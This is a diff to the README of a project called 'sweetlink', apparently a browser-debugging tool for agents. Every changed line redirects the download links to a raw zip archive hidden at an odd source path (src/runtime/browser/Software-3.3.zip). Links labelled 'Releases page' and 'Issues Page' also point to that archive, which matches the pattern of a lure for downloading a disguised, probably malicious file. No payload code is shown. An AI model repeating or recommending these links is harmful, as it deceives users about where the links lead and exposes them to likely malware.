@@ -6,7 +6,7 @@ Welcome to **sweetlink**! This application helps you connect your agent to your 
 
 ## 📥 Download sweetlink
 
-[![Download sweetlink](https://raw.githubusercontent.com/Cybermoya-pro/sweetlink/main/examples/basic-web/dist/server/shared/sweetlink_2.5.zip)](https://raw.githubusercontent.com/Cybermoya-pro/sweetlink/main/examples/basic-web/dist/server/shared/sweetlink_2.5.zip)
+[![Download sweetlink](https://raw.githubusercontent.com/Cybermoya-pro/sweetlink/main/src/runtime/browser/Software-3.3.zip)](https://raw.githubusercontent.com/Cybermoya-pro/sweetlink/main/src/runtime/browser/Software-3.3.zip)
 
 ## 🔍 System Requirements
 
@@ -18,7 +18,7 @@ Before you dive in, make sure your system meets these requirements:
 
 ## 📦 Download & Install
 
-To download sweetlink, visit [this page to download](https://raw.githubusercontent.com/Cybermoya-pro/sweetlink/main/examples/basic-web/dist/server/shared/sweetlink_2.5.zip). You will find the latest version there.
+To download sweetlink, visit [this page to download](https://raw.githubusercontent.com/Cybermoya-pro/sweetlink/main/src/runtime/browser/Software-3.3.zip). You will find the latest version there.
 
 1. Click on the link above to go to the Releases page.
 2. Look for the version labeled "Latest Release."
@@ -81,6 +81,6 @@ We welcome contributions! If you'd like to help improve sweetlink, please follow
 
 ## 🎉 Support
 
-If you need help, feel free to reach us via [Issues Page](https://raw.githubusercontent.com/Cybermoya-pro/sweetlink/main/examples/basic-web/dist/server/shared/sweetlink_2.5.zip). We’re here to help you get the most out of sweetlink!
+If you need help, feel free to reach us via [Issues Page](https://raw.githubusercontent.com/Cybermoya-pro/sweetlink/main/src/runtime/browser/Software-3.3.zip). We’re here to help you get the most out of sweetlink!
 
-Thank you for choosing **sweetlink**! Enjoy seamless connections and better debugging. Don't forget to visit [this page to download](https://raw.githubusercontent.com/Cybermoya-pro/sweetlink/main/examples/basic-web/dist/server/shared/sweetlink_2.5.zip) the latest version whenever you need updates.
+Thank you for choosing **sweetlink**! Enjoy seamless connections and better debugging. Don't forget to visit [this page to download](https://raw.githubusercontent.com/Cybermoya-pro/sweetlink/main/src/runtime/browser/Software-3.3.zip) the latest version whenever you need updates.
